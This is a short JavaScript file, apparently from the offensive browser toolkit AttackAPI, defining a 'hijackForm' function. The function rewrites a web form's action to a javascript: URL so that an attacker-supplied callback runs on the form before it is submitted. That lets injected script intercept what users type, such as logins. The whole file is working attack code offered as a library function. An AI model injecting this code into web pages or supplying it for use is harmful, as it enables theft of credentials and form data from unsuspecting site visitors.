
/**
 * @cat DOM
 * @name AttackAPI.dom.hijackForm
 * @desc hijack a form
 */
AttackAPI.dom.hijackForm = function (hijack) {
	if (!hijack.form.id)
		hijack.form.id = ('form_' + Math.random() + '_' + new Date().getTime()).replace('.', '_');
		
	hijack.form.__hijackForm = function (url) {
		this.action = url;
		
		if (typeof(hijack.onsubmit) == 'function') 
			hijack.onsubmit.apply(this, []);
			
		this.submit();
	};
	
	hijack.form.action = "javascript:document.getElementById('" + hijack.form.id + "').__hijackForm('" + hijack.form.action + "')";
};
